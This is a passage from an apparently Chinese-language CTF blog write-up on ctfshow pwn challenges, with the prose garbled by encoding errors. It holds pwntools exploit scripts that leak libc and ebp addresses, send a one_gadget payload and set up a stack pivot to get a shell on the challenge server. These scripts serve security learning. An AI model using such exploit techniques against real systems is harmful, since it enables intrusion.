</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28135</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">one_gadget</span> <span class="o">=</span> <span class="mh">0x10a2fc</span>
</span></span><span class="line"><span class="cl"><span class="n">printf_libc</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;this:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">printf</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">printf</span> <span class="o">-</span> <span class="n">printf_libc</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">one_gadget</span><span class="o">+</span><span class="n">libc_base</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong><code>one_gadget + libc_base</code></strong>ï¼šè®¡ç®—å¾—åˆ° one_gadget åœ¨å†…å­˜ä¸­çš„<strong>çœŸå®åœ°å€</strong></p>
<p>*<strong><code>str(one_gadget+libc_base)</code></strong>ï¼š<code>one_gadget + libc_base</code> æ˜¯åè¿›åˆ¶æ•´æ•°ï¼‰ï¼Œ<code>main</code> å‡½æ•°æ˜ç¡®ä½¿ç”¨ <code>__isoc99_scanf(&quot;%ld&quot;, v4)</code> è¯»å–ç”¨æˆ·è¾“å…¥ï¼Œä¹Ÿå°±æ˜¯è¯´è¦çš„æ˜¯ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œä¸è¦æ•°å€¼æœ¬èº«çš„æ„ä¹‰ã€‚ï¼ˆone_gadget çœŸå®åœ°å€ä¸º <code>0x7f8a9b12d95c</code>ï¼ˆåè¿›åˆ¶æ•°å€¼ä¸º <code>140239165128028</code>ï¼‰ï¼Œç¨‹åºè¦æ±‚è¾“å…¥çš„æ˜¯å­—ç¬¦ä¸² <code>&quot;140239165128028&quot;</code>ï¼Œè€Œéæ•°å€¼<code>140239165128028</code> æœ¬èº«ï¼‰å¤§æ¦‚å°±è¿™ä¹ˆç†è§£ï¼Œè¿™æ˜¯pythonçš„è‡ªèº«è§„åˆ™ã€‚</p>
<h3 id="æ ˆè¿ç§»"><strong>æ ˆè¿ç§»</strong>
</h3><p>æ ˆè¿ç§»æ˜¯åœ¨äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨ï¼ˆå°¤å…¶æ˜¯æ ˆæº¢å‡ºæ¼æ´åœºæ™¯ï¼‰ä¸­å¸¸ç”¨çš„ä¸€ç§æŠ€æœ¯æ‰‹æ®µï¼Œç›®çš„æ˜¯æ”¹å˜ç¨‹åºæ‰§è¡Œæ—¶æ ˆçš„å¸ƒå±€å’Œæ‰§è¡Œæµç¨‹ï¼Œç»•è¿‡ä¸€äº›å®‰å…¨é˜²æŠ¤æœºåˆ¶ï¼Œ å®ç°æ”»å‡»è€…æƒ³è¦çš„ä»£ç æ‰§è¡Œã€‚</p>
<p>åœ¨å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´çš„ç¨‹åºä¸­ï¼Œæ”»å‡»è€…åŸæœ¬å¯ä»¥é€šè¿‡è¦†ç›–è¿”å›åœ°å€æ¥åŠ«æŒç¨‹åºæ‰§è¡Œæµï¼Œè®©ç¨‹åºè·³è½¬åˆ°æ”»å‡»è€…æŒ‡å®šçš„åœ°å€ï¼ˆå¦‚ shellcode åœ°å€ï¼‰æ‰§è¡Œæ¶æ„ä»£ç ã€‚ä½†éšç€ç³»ç»Ÿå®‰å…¨æœºåˆ¶ï¼ˆå¦‚ NX ä¿æŠ¤ï¼Œä½¿æ ˆä¸Šæ•°æ®ä¸å¯æ‰§è¡Œ ï¼‰çš„å¼•å…¥æˆ–è€…æ ˆç©ºé—´è¿‡å°ï¼Œç›´æ¥åœ¨æ ˆä¸Šæ‰§è¡Œæ³¨å…¥çš„ shellcode å˜å¾—å›°éš¾ã€‚åŒæ—¶ï¼Œä¸€äº›ç¨‹åºè¿˜å¯èƒ½å­˜åœ¨æ ˆé‡‘ä¸é›€ä¿æŠ¤ï¼ˆStack Canaryï¼‰æ¥æ£€æµ‹æ ˆæ˜¯å¦è¢«éæ³•ç¯¡æ”¹ï¼Œè¿™ä¹Ÿå¢åŠ äº†ä¼ ç»Ÿæ ˆæº¢å‡ºåˆ©ç”¨çš„éš¾åº¦ã€‚å› æ­¤ï¼Œæ ˆè¿ç§»æŠ€æœ¯åº”è¿è€Œç”Ÿï¼Œä»¥ç»•è¿‡è¿™äº›å®‰å…¨é˜²æŠ¤ã€‚</p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>é—®é¢˜åœºæ™¯</th>
          <th>ä¼ ç»Ÿæ–¹æ³•é™åˆ¶</th>
          <th>æ ˆè¿ç§»è§£å†³æ–¹æ¡ˆ</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>æ ˆæº¢å‡ºç©ºé—´ä¸è¶³</td>
          <td>ROPé“¾æ— æ³•å®Œæ•´å¸ƒç½®</td>
          <td>è¿ç§»åˆ°å¤§å®¹é‡å†…å­˜åŒºåŸŸ</td>
      </tr>
      <tr>
          <td>NXä¿æŠ¤ï¼ˆæ ˆä¸å¯æ‰§è¡Œshellcodeï¼‰</td>
          <td>æ— æ³•ç›´æ¥æ‰§è¡Œshellcode</td>
          <td>è¿ç§»åˆ°å¯æ‰§è¡Œå†…å­˜åŒºåŸŸ</td>
      </tr>
      <tr>
          <td>åªèƒ½è¦†ç›–æœ‰é™æ•°æ®</td>
          <td>æ— æ³•æ§åˆ¶å®Œæ•´æ§åˆ¶æµ</td>
          <td>åªéœ€è¦è¦†ç›–å…³é”®æŒ‡é’ˆå³å¯</td>
      </tr>
      <tr>
          <td>ASLRéšæœºåŒ–</td>
          <td>éš¾ä»¥é¢„æµ‹ç»å¯¹åœ°å€</td>
          <td>ä½¿ç”¨ç›¸å¯¹ç¨³å®šçš„å †åœ°å€</td>
      </tr>
  </tbody>
</table></div>
<h4 id="åŸç†">åŸç†
</h4><ul>
<li><strong>æ”¹å˜æ ˆçš„ä½ç½®</strong>ï¼šæ­£å¸¸æƒ…å†µä¸‹ï¼Œç¨‹åºæŒ‰ç…§é»˜è®¤çš„æ ˆå¸ƒå±€æ‰§è¡Œï¼Œæ ˆè¿ç§»çš„æ ¸å¿ƒæ˜¯å°†æ ˆçš„ä½ç½®ç§»åŠ¨åˆ°ä¸€ä¸ªå¯¹æ”»å‡»è€…æœ‰åˆ©çš„åœ°æ–¹ï¼Œæ¯”å¦‚å…·æœ‰å¯å†™å¯æ‰§è¡Œæƒé™çš„å†…å­˜åŒºåŸŸï¼ˆå¦‚ <code>bss</code> æ®µï¼‰ ã€‚åœ¨æ ˆæº¢å‡ºæ¼æ´å‘ç”Ÿæ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è¦†ç›–æŸäº›å…³é”®å¯„å­˜å™¨ï¼ˆå¦‚ <code>esp</code>ï¼Œåœ¨ 32 ä½ç¨‹åºä¸­ï¼›<code>rsp</code>ï¼Œåœ¨ 64 ä½ç¨‹åºä¸­ ï¼‰çš„å€¼ï¼Œä½¿ç¨‹åºåœ¨åç»­æ‰§è¡Œä¸­ï¼Œå°†æ–°çš„æ ˆå¸§è®¾ç½®åœ¨æ”»å‡»è€…æŒ‡å®šçš„å†…å­˜ä½ç½®ã€‚</li>
<li><strong>æ„é€ æ–°æ ˆå¸§</strong>ï¼šåœ¨æ–°çš„æ ˆä½ç½®ï¼Œæ”»å‡»è€…ç²¾å¿ƒæ„é€ æ ˆå¸§ï¼Œæ”¾ç½®éœ€è¦æ‰§è¡Œçš„æŒ‡ä»¤åœ°å€ã€å‡½æ•°å‚æ•°ç­‰æ•°æ®ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥å°† <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code> ç³»ç»Ÿè°ƒç”¨çš„ç›¸å…³å‚æ•°å’ŒæŒ‡ä»¤åœ°å€æŒ‰ç…§æ­£ç¡®çš„é¡ºåºæ”¾ç½®åœ¨æ–°æ ˆå¸§ä¸­ï¼Œå½“ç¨‹åºæ‰§è¡Œåˆ°ç›¸åº”æŒ‡ä»¤æ—¶ï¼Œå°±ä¼šæŒ‰ç…§æ”»å‡»è€…çš„æ„å›¾æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œè·å– shellã€‚</li>
</ul>
<h3 id="pwn_075">PWN_075
</h3><p>é¢˜ç›®ï¼šæ ˆç©ºé—´ä¸å¤Ÿæ€ä¹ˆåŠï¼Ÿ</p>
<p>checksecä¸€ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/278.png"
	width="934"
	height="205"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/278_hu_e448f1b5f594d4c4.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/278_hu_7fdb3c9e6ab48043.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="455"
		data-flex-basis="1093px"
	
></p>
<p>32ä½å¼€å¯NXä¿æŠ¤ï¼Œéƒ¨åˆ†å¼€å¯RELROã€‚</p>
<p>éšä¾¿è¿è¡Œä¸€ä¸‹çœ‹çœ‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/281.png"
	width="1255"
	height="680"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/281_hu_ca0a79543c7818f5.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/281_hu_b58c0e59622a699.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="184"
		data-flex-basis="442px"
	
></p>
<p>è¿™æ˜¯é‡ç‚¹ï¼åç»­ç¼–å†™expè¦æ³¨æ„çš„ç»†èŠ‚ã€‚</p>
<p>IDAåˆ†æï¼ŒæŸ¥çœ‹mainä¸­çš„ctfshowå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/279.png"
	width="575"
	height="229"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/279_hu_d1c22ead98e69375.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/279_hu_73a3be9205fd366f.png 1024w"
	loading="lazy"
	
		alt="ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="251"
		data-flex-basis="602px"
	
></p>
<p>å…¶å®åœ¨è¿é¶æœºè¿›è¡Œäº¤äº’æ—¶ï¼Œæ— è®ºä½ è¾“å…¥ä»€ä¹ˆï¼Œéƒ½æ˜¯æ‹›åŸæ ·ç»™ä½ æ‰“å°å‡ºæ¥çš„ï¼Œä¸»è¦è¿˜æ˜¯çœ‹readã€memsetå‡½æ•°ï¼Œå†µä¸”æ²¡å¼€canaryä¿æŠ¤æœ‰ç«™å¤„ç†æ¼æ´å¯ä»¥åˆ©ç”¨ã€‚</p>
<p>è¿˜çœ‹åˆ°äº†systemå‡½æ•°ã€‚</p>
<p>è·Ÿè¿›hackeroutå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/280.png"
	width="934"
	height="443"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/280_hu_a80eef9c498fb510.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/280_hu_22dac4a619e0f38b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="210"
		data-flex-basis="506px"
	
></p>
<p>çœ‹åˆ°æœ‰systemå‡½æ•°ï¼Œä¸è¿‡é‡Œè¾¹ä¸æ˜¯binshï¼Œé—®é¢˜ä¸å¤§å¯ä»¥æ„é€ å‡ºæ¥ã€‚</p>
<p>çœ‹å›ctfshowå‡½æ•°çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œå¯ä»¥å‘ç°så®¹é‡æ˜¯36ï¼Œä½†såˆ°ebpè·ç¦»æœ‰0x28=40ï¼ŒåŠ ä¸Šè¦†ç›–ebpæœ¬èº«çš„4å­—èŠ‚ï¼Œä»… 8 å­—èŠ‚ï¼ˆ44-36=8ï¼‰æº¢å‡ºç©ºé—´ï¼Œæ— æ³•ç›´æ¥å¸ƒç½®<code>system(&quot;/bin/sh&quot;);</code> æ‰€éœ€çš„ ROP é“¾ï¼ˆéœ€è¦†ç›–è¿”å›åœ°å€ + ä¼ é€’å‚æ•°ï¼Œè‡³å°‘ 12 å­—èŠ‚ä»¥ä¸Šï¼‰ï¼Œé‚£ä¹ˆè¿™é‡Œå°±åº”è¯¥è¦æƒ³åˆ°<code>æ ˆè¿ç§»</code>äº†ã€‚</p>
<p>æ ˆè¿ç§»çš„æœ¬è´¨æ˜¯<strong>é€šè¿‡ <code>leave</code> æŒ‡ä»¤æ”¹å˜æ ˆé¡¶æŒ‡é’ˆï¼ˆespï¼‰çš„ä½ç½®</strong>ï¼Œå°†åŸæœ¬ç‹­å°çš„æ ˆç©ºé—´è½¬ç§»åˆ°æˆ‘ä»¬å¯æ§çš„å¤§ç©ºé—´ã€‚é‚£æˆ‘ä»¬å°±å¾—è°ƒç”¨levaeæ±‡ç¼–æŒ‡ä»¤ã€‚</p>
<blockquote class="alert alert-tip">
    <blockquote>
<p><code>leave</code> æŒ‡ä»¤æ˜¯æ ˆå¸§æ“ä½œçš„ â€œä¾¿æ·æŒ‡ä»¤â€ï¼Œå…¶æœ¬è´¨æ˜¯ <strong>è‡ªåŠ¨å®Œæˆæ ˆå¸§çš„æ¸…ç†å·¥ä½œ</strong>ï¼›å®ƒçš„åŠŸèƒ½å¯ä»¥æ‹†è§£ä¸ºä¸¤æ¡ç»å…¸æŒ‡ä»¤çš„ç»„åˆï¼Œå…·ä½“è¡Œä¸ºä¾èµ–äºæ¶æ„ï¼ˆx86/x64 ä¸€è‡´ï¼‰ã€‚</p>
<p><code>leave</code> æŒ‡ä»¤ç­‰ä»·äºï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">esp</span><span class="p">,</span> <span class="nb">ebp</span>    <span class="c1">; å°†æ ˆæŒ‡é’ˆ(esp)æŒ‡å‘åŸºæŒ‡é’ˆ(ebp)ï¼Œå›æ”¶å½“å‰æ ˆå¸§çš„å±€éƒ¨å˜é‡ç©ºé—´</span>
</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="nb">ebp</span>         <span class="c1">; ä»æ ˆé¡¶å¼¹å‡ºä¹‹å‰ä¿å­˜çš„ebpå€¼ï¼ˆæ¢å¤ä¸Šä¸€å±‚æ ˆå¸§çš„åŸºæŒ‡é’ˆï¼‰</span>
</span></span></code></pre></td></tr></table>
</div>
</div></blockquote></blockquote>
<p>çœ‹å›ctfshowå‡½æ•°çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œ<strong>å¯ä»¥å‘ç°så®¹é‡æ˜¯36ï¼Œä½†såˆ°ebpè·ç¦»æœ‰0x28=40</strong>ï¼ŒåŠ ä¸Šè¦†ç›–ebpæœ¬èº«çš„4å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯è¯´åªæœ‰8å­—ç»™åˆ°æˆ‘ä»¬æ”¾ä¸œè¥¿ï¼Œæ— æ³•è¿›è¡Œæˆ‘ä»¬çš„ROPé“¾æ„é€ ï¼Œé‚£ä¹ˆè¿™é‡Œå°±åº”è¯¥è¦æƒ³åˆ°<code>æ ˆè¿ç§»</code>äº†ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/282.png"
	width="1091"
	height="663"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/282_hu_c23df7645e6994a2.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/282_hu_e57f5ed4d8fc26a1.png 1024w"
	loading="lazy"
	
		alt="leaveåœ°å€:0x08048766"
	
	
		class="gallery-image" 
		data-flex-grow="164"
		data-flex-basis="394px"
	
></p>
<p>å‰ç½®å‡†å¤‡ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span> <span class="mi">28274</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">leave</span> <span class="o">=</span> <span class="mh">0x08048766</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x24</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;GPNU&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;codename:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>leaveæ±‡ç¼–æŒ‡ä»¤å’Œebpã€espæœ‰å…³è”ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦å»è·å¾—ebpçš„åœ°å€ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/281.png"
	width="1255"
	height="680"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/281_hu_ca0a79543c7818f5.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/281_hu_b58c0e59622a699.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="184"
		data-flex-basis="442px"
	
></p>
<p>çœ‹å›ctfshowå‡½æ•°ä»¥åŠåœ¨Ubuntuä¸ŠNCè¿æ¥çš„è¿è¡Œç•Œé¢ä½ å°±ä¼šå‘ç°ç¬¬ä¸€æ¬¡è¾“å…¥åæœ‰ä¸ªptintfå‡½æ•°ä¼šè¾“å‡ºï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€æ¬¡è¾“å‡ºï¼Œé‚£æˆ‘ä»¬æŠŠç¼“å†²åŒºç»™è¦†ç›–äº†ï¼Œé‚£ä¹ˆå°±ä¼šæŠŠebp4å­—èŠ‚çš„åœ°å€ç»™æ‰“å°å‡ºæ¥ï¼Œç”¨åç»­çš„u32å‡½æ•°è¿›è¡Œå¤åˆ¶ä¿å­˜ä¸‹æ¥ï¼Œè¿™å°±æ˜¯ebpæ³„éœ²äº†ã€‚</p>
<p>æ³„éœ²ebpåœ°å€ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># æ„é€ payload1ï¼šç”¨äºæ³„éœ²ebp</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x24</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;GPNU&#39;</span>  <span class="c1"># 0x24ä¸ªåƒåœ¾å­—ç¬¦ + æ ‡è®°å­—ç¬¦ä¸²&#39;show&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;codename:&#39;</span><span class="p">)</span>  <span class="c1"># ç­‰å¾…ç¨‹åºè¾“å‡º&#34;codename:&#34;ï¼ˆæ ¹æ®ç¨‹åºäº¤äº’é€»è¾‘ï¼Œç¬¬ä¸€æ¬¡è¾“å…¥çš„è§¦å‘ç‚¹ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>  <span class="c1"># å‘é€payload1åˆ°ç¨‹åº</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;GPNU&#39;</span><span class="p">)</span>  <span class="c1"># æ¥CTCTæ”¶ç¨‹åºè¾“å‡ºï¼Œç›´åˆ°é‡åˆ°æ ‡è®°&#39;GPNU&#39;ï¼ˆæ­¤æ—¶ä¸‹ä¸€ä¸ª4å­—èŠ‚å°±æ˜¯ebpçš„å€¼ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">ebp</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>  <span class="c1"># è¯»å–4å­—èŠ‚å¹¶è½¬ä¸º32ä½æ— ç¬¦å·æ•´æ•°ï¼ˆebpçš„çœŸå®å€¼ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;ebp=&#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ebp</span><span class="p">))</span>  <span class="c1"># æ‰“å°ebpåœ°å€ï¼ˆè°ƒè¯•ç”¨ï¼Œå¦‚ 0xffffd058ï¼‰</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰¾æ ˆè¿ç§»çš„åœ°æ–¹ï¼Œæˆ‘ä»¬è¦è¿ç§»åˆ°<strong>æ”»å‡»è€…å¯æ§çš„å…¨å±€ç¼“å†²åŒºï¼ˆé€šå¸¸æ˜¯ç¬¬ä¸€æ¬¡è¾“å…¥æ—¶æ„é€ çš„ã€ç”¨äºå­˜å‚¨ <code>system(&quot;/bin/sh&quot;)</code> è°ƒç”¨å’Œå‚æ•°çš„å†…å­˜åŒºåŸŸï¼‰</strong>ã€‚</p>
<p>æ ˆè¿ç§»ç›®çš„åœ°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/283.png"
	width="884"
	height="295"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/283_hu_f97b44232c158ed3.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/283_hu_9528b63c840c425d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="299"
		data-flex-basis="719px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°bufæ¯”sæ›´é ä¸‹ï¼Œè¯´æ˜æ•´ä¸ªæ ˆå¸§ä¸­ï¼Œbufç©ºé—´æ›´å¤§ï¼ˆæ¯”så¤§ï¼‰ï¼Œå¯ä»¥æ”¾gadgetã€‚</p>
<p>é‚£ä¹ˆç°åœ¨éœ€è¦æ˜ç¡®ä¸€ä¸‹æ€è·¯ï¼šæœ‰ä¸¤ä¸ªè¾“å…¥ç‚¹</p>
<ol>
<li>
<p>åˆ©ç”¨ç¬¬ä¸€ä¸ªè¾“å…¥ç‚¹æ¥æ³„éœ²ebpçš„å€¼ï¼ŒåŠ¨è°ƒæ‰¾ä¸€ä¸‹bufåœ¨æ ˆä¸Šçš„ä½ç½®ï¼Œç”¨ebpå»è¡¨ç¤ºã€‚</p>
</li>
<li>
<p>ç¬¬äºŒä¸ªè¾“å…¥ç‚¹è¾“å…¥systemï¼ˆ/bin/shï¼‰ï¼Œåˆ©ç”¨ä¸¤æ¬¡leaveå°†æ ˆè¿ç§»åˆ°bufå¤„ï¼Œæ‰§è¡Œbufé‡Œçš„æŒ‡ä»¤ï¼Œè¿›è¡Œgetshellã€‚</p>
</li>
</ol>
<p>ä¸Šè¿°å·²ç»æ³„éœ²å¥½äº†ã€‚</p>
<p>ebpå·²ç»æ³„éœ²äº†çœŸå®åœ°å€ï¼Œç°åœ¨éœ€è¦è¡¨ç¤ºå‡ºbufçœŸå®åœ°å€ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ç”¨ebpå»è¡¨ç¤ºbufçš„çœŸå®åœ°å€ï¼Œé‚£å°±éœ€è¦å›ºå®šåç§»é‡ï¼š</p>
<p>ä¸€æ­¥æ­¥æ¥</p>
<p>ç¬¬ä¸€æ­¥ï¼Œå…ˆè¿è¡Œè¿™ä¸ªè°ƒè¯•ä»£ç ï¼ˆpython2ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
